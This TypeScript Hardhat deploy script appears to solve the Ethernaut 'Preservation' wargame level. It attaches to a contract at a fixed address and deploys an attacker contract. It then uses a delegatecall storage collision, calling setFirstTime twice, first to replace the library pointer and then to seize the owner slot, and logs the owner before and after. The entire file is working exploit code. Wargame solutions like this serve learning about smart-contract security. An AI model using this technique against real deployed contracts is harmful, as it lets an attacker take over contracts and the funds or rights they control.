import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { PreservationAttack__factory, Preservation__factory } from '../../typechain-types';

const func:DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const preservationAddress = "0xb0028e403c6ECE7f56bde9d5f2E41130BAF3F706"

    const Preservation = await ethers.getContractFactory("Preservation",(await ethers.getSigners())[0]) as Preservation__factory
    const PreservationAttack = await ethers.getContractFactory("PreservationAttack",(await ethers.getSigners())[0]) as PreservationAttack__factory;

    console.log(">>>>Attach Preservation contract");
    const preservation = await Preservation.attach(preservationAddress);
    
    console.log(">>>>Deploy PreservationAttack contract");
    const preservationAttack = await PreservationAttack.deploy();
    await preservationAttack.deployed();
    
    console.log("timeZone1Library:",await preservation.timeZone1Library());
    console.log(">>setFirstTime(preservation Attack address)");
    const setFirstTimeAddressReasult = await preservation.setFirstTime(await preservationAttack.address)
    await setFirstTimeAddressReasult.wait();
    console.log("timeZone1Library:",await preservation.timeZone1Library());
    
    console.log("owner:",await preservation.owner());
    const setFirstTimeReasult = await preservation.setFirstTime((await ethers.getSigners())[0].address)
    await setFirstTimeReasult.wait();
    console.log("owner:",await preservation.owner());

}

export default func;
func.tags = ['PreservationAttack'];